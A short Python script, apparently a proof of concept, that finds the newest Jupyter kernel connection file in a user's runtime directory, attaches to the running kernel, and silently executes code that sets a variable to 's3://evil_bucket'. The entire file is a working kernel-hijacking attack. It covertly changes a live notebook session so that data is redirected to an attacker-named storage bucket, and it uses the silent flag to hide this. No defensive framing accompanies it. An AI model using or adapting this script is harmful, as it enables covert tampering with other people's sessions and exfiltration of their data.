import os
import jupyter_client

search_dir = "/home/jolucas/.local/share/jupyter/runtime/"
os.chdir(search_dir)
files = filter(os.path.isfile, os.listdir(search_dir))
files = [os.path.join(search_dir, f) for f in files]
files.sort(key=lambda x: os.path.getmtime(x))
cf = jupyter_client.find_connection_file(files[-1])
kc = jupyter_client.BlockingKernelClient(connection_file = cf)
kc.load_connection_file()
kc.start_channels()
kc.execute_interactive(code="bucket = 's3://evil_bucket'", silent=True)